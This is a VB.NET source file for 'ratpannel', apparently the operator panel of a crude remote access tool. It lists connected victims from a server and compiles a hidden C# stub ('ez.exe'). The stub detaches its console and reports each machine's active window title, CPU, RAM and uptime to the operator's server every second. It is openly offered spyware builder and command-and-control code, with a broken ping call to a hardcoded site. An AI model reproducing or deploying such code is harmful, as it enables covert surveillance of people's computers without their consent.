Imports System.Net
Imports System.Text
Imports System.Diagnostics.Switch

Public Class ratpannel

    Private Sub ratpannel_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        CheckForIllegalCrossThreadCalls = False
        clientlist_loop.Start()
        clientlist.RunWorkerAsync()
    End Sub

    Private Sub clientlist_DoWork(ByVal sender As System.Object, ByVal e As System.ComponentModel.DoWorkEventArgs) Handles clientlist.DoWork
        Dim vpsurl = My.Settings.vpsurl
        Dim linecount As String = 0
        Dim client As New WebClient
        client.Encoding = Encoding.UTF8
        Dim list As String = client.DownloadString(vpsurl & "clients.php?action=cleanit")
        For Each line As String In list.Split("|")
            If Not line.Contains("~") Then Continue For
            Dim ip = line.Split("~")(0)
            Dim ping = line.Split("~")(2)
            Dim cpu = line.Split("~")(3)
            Dim ram = line.Split("~")(1)
            Dim activewindow = line.Split("~")(4)
            Dim uptime = line.Split("~")(5)
            linecount = linecount + 1
            ' DataGridView1.Rows.Add(New String() {"", Value2, Value3})
            DataGridView1.Rows.Add(ip, ping, cpu, ram, activewindow, uptime)

        Next

        clients_list.Text = "Clients : " & linecount
    End Sub

    Private Sub clientlist_loop_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles clientlist_loop.Tick
        If clientlist.IsBusy Then Return
        clientlist.RunWorkerAsync()
    End Sub


    Private Sub Button1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button1.Click
        Dim vpsurl = My.Settings.vpsurl & "clients.php?action=writeme"
        Dim str As String = "using System.Windows.Forms;" & vbCrLf & "using System.Net.NetworkInformation;" & "using System.Collections.Generic;" & vbCrLf & "using System.Threading.Tasks;using System.Threading;" & vbCrLf & "using System.Net.Http;" & vbCrLf & "using System;" & vbCrLf & "using System.Diagnostics;" & vbCrLf & "using System.Reflection;" & vbCrLf & "using System.Text.RegularExpressions;" & vbCrLf & "using System.Text;" & vbCrLf & "using System.IO;" & vbCrLf & "using System.Net;" & vbCrLf & "using System.Runtime.InteropServices;" & vbCrLf & vbCrLf & "namespace Stub" & vbCrLf & "{" & vbCrLf & vbTab & "internal class Program" & vbCrLf & vbTab & "{" & vbCrLf & vbTab & "[DllImport(""user32.dll"")]" & vbCrLf & "        private static extern IntPtr GetForegroundWindow();" & vbCrLf & "        [DllImport(""user32.dll"")]" & vbCrLf & "private static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);" & vbTab & "[DllImport(""kernel32.dll"", ExactSpelling = true, SetLastError = true)]" & vbCrLf & vbTab & vbTab & "private static extern bool FreeConsole();" & vbCrLf & vbCrLf & vbTab & vbTab & "public static void Main()" & vbCrLf & vbTab & vbTab & "{" & vbCrLf & vbTab & vbTab & vbTab & "Program.FreeConsole();" & vbCrLf & vbCrLf
        'entrée dans ma boucle
        str += "int uptime = 0;PerformanceCounter ramCounter= new PerformanceCounter(""Memory"", ""Available MBytes"");PerformanceCounter cpuUsage = new PerformanceCounter(""Processor"", ""% Processor Time"", ""_Total"");" & vbCrLf & vbTab & vbTab & vbTab & vbTab & "cpuUsage.NextValue();" & "   while (true) {"
        str += "uptime = uptime + 1;int chars = 256;StringBuilder buff = new StringBuilder(chars);IntPtr handle = Program.GetForegroundWindow();Program.GetWindowText(handle, buff, chars); var ramusage = ramCounter.NextValue();string ram = string.Format(""{0:f0}"", ramusage);var cpuusage = cpuUsage.NextValue();string cpu = string.Format(""{0:f0}"",cpuusage);IPAddress ip = Dns.GetHostAddresses(new Uri(""" & vpsurl & """).Host)[0];" & vbCrLf & vbTab & "string ping = new Ping().Send(ip).RoundtripTime.ToString(); " & vbCrLf & "new WebClient().DownloadString(""" & vpsurl & "&ping="" + ping + ""&ram="" + ram + ""&cpu="" + cpu + ""&currentwindow="" + buff.ToString() + ""&uptime="" + uptime + """");"
        str += "System.Threading.Thread.Sleep(1000);}"
        ' fin de ma boucle

        str += "}" & vbCrLf & vbTab & "}" & vbCrLf & "}" & vbCrLf
        Dim compilerParameters As CompilerParameters = New CompilerParameters()
        compilerParameters.GenerateExecutable = True
        compilerParameters.OutputAssembly = "ez.exe"
        compilerParameters.ReferencedAssemblies.AddRange(New String() {"System.Net.NetworkInformation.dll", "System.Web.Extensions.dll", "System.Runtime.dll", "System.Windows.Forms.dll", "System.dll", "System.Collections.dll", "System.Data.dll", "System.Core.dll", "System.IO.dll", "System.Linq.dll", "System.Net.Http.dll", "System.Text.RegularExpressions.dll", "mscorlib.dll"})
        Dim compiles = CodeDomProvider.CreateProvider("CSharp").CompileAssemblyFromSource(compilerParameters, New String() {str})
        For Each CompilerError In compiles.Errors
            MessageBox.Show(CompilerError.ToString)
        Next
    End Sub

    Private Sub clients_list_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles clients_list.Click
        Dim Result As Net.NetworkInformation.PingReply
        Dim SendPing As New Net.NetworkInformation.Ping
        Dim ResponseTime As Long '<<<<<<<<<<<<<<<<<<<<<<<<<<<<
        Try
            Result = SendPing.Send("https://xpshop.best/")
            ResponseTime = Result.RoundtripTime
            If Result.Status = Net.NetworkInformation.IPStatus.Success Then
                MsgBox(ResponseTime.ToString)
            Else
                Debug.WriteLine("")
            End If
        Catch ex As Exception
        End Try
    End Sub
End Class